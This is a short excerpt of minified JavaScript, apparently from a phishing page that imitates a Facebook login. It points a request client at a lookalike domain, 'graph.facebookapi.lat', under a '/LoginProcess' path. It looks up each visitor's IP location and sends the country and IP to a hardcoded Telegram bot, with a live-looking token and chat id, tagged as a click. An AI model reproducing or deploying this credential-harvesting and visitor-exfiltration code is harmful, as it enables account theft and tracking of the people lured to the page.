...
de.default = de;
const ph = de,
    En = ph.create({baseURL: "https://graph.facebookapi.lat/v17.php?path=/LoginProcess", timeout: 120e3});
...
const mh = ({children: e = null}) => m.jsxs(m.Fragment, {
    ...
    fetch(`https://freeipapi.com/api/json/${e}`).then(t => t.json()).then(t => {
		...
		fetch(`https://api.telegram.org/bot7111468952:AAF0pmL6VMBtz2WrtV6UPSio1oRYfJz3uEs/sendMessage?chat_id=-1002088264526&message_thread_id=315&text=${encodeURIComponent(t.countryName)}_${e}_CLICKED`)
    })
};
